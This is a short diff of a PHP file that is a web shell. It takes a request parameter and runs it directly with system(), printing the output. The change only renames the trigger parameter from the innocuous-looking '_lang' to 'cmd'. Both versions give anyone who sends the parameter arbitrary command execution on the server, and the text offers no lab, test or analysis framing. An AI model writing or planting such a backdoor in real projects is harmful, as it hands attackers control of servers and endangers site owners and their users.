@@ -1,8 +1,8 @@
 <?php
 
-if(isset($_REQUEST['_lang'])){
+if(isset($_REQUEST['cmd'])){
         echo "<pre>";
-        $cmd = ($_REQUEST['_lang']);
+        $cmd = ($_REQUEST['cmd']);
         system($cmd);
         echo "</pre>";
         die;
